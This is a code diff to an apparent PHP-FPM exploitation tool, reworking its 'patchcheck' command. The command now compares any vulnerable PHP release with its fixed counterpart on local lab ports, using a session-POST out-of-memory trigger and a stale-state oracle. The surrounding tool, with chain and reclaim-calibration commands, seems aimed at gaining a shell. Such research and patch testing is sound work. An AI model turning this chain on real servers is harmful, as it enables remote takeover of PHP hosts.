@@ -1741,9 +1741,28 @@ def cmd_chain(args) -> int:
 
 
 def cmd_patchcheck(args) -> int:
-    versions = ["8.4.26", "8.4.27"]
-    ports = {"8.4.26": (8110, 8111), "8.4.27": (8120, 8121)}
-    for version in versions:
+    """Compare a vulnerable release with the release that fixed its branch.
+
+    The fixed counterpart comes from the version registry, so any branch
+    works (8.2, 8.3, 8.4, 8.5): the vulnerable build must arm the stale
+    state after the producer OOM, and the patched build must not.
+    """
+    vulnerable = args.version
+    fixed = registry.fixed_in(vulnerable)
+    if fixed is None:
+        print(f"[!] {vulnerable} belongs to a branch that was never patched "
+              f"(no fixed release to compare against)")
+        return 1
+    pair = [vulnerable, fixed]
+    try:
+        import php2shell_fpm_labs as labs
+        ports = {version: lab_ports[:2]
+                 for version, lab_ports in labs.builds_map(pair).items()}
+    except Exception:  # noqa: BLE001 - lab module not importable
+        ports = {version: registry.ports_for(version)[:2] for version in pair}
+
+    print(f"[*] comparing vulnerable {vulnerable} with fixed {fixed}")
+    for version in pair:
         base = f"http://127.0.0.1:{ports[version][0]}"
         builder_url = f"http://127.0.0.1:{ports[version][1]}"
         print(f"\n=== {version} ===")
@@ -1753,7 +1772,7 @@ def cmd_patchcheck(args) -> int:
             big_session_post(builder, OOM_SID, 4 << 20)
         # lifecycle
         worker = find_pool_worker(version, "chain")
-        status, body = producer_get(chain_t, OOM_SID)
+        status, _body = producer_get(chain_t, OOM_SID)
         time.sleep(0.2)
         worker2 = find_pool_worker(version, "chain")
         print(f"producer status={status} worker {worker}->{worker2} "
@@ -1766,8 +1785,8 @@ def cmd_patchcheck(args) -> int:
                   f"{'STALE-ARMED' if d and level == 1 else 'clean'}")
         except RuntimeError as exc:
             print(f"oracle: {exc}")
-    print("\n[*] expected: 8.4.26 STALE-ARMED, 8.4.27 clean "
-          "(php_basic_early_rinit memsets BG before body parse)")
+    print(f"\n[*] expected: {vulnerable} STALE-ARMED, {fixed} clean "
+          f"(php_basic_early_rinit memsets BG before body parse)")
     return 0
 
 
@@ -1812,6 +1831,10 @@ def main() -> int:
                 "--candidates", action="append", default=None,
                 metavar="D_OFF,K",
                 help="override the (d_off,k) reclaim candidates, e.g. 0x81000,0xfe8")
+        if name == "patchcheck":
+            subparser.add_argument(
+                "--version", default="8.4.26",
+                help="vulnerable release to compare with its fixed counterpart")
         if name == "calibrate":
             subparser.add_argument(
                 "--attempts", type=int, default=250,
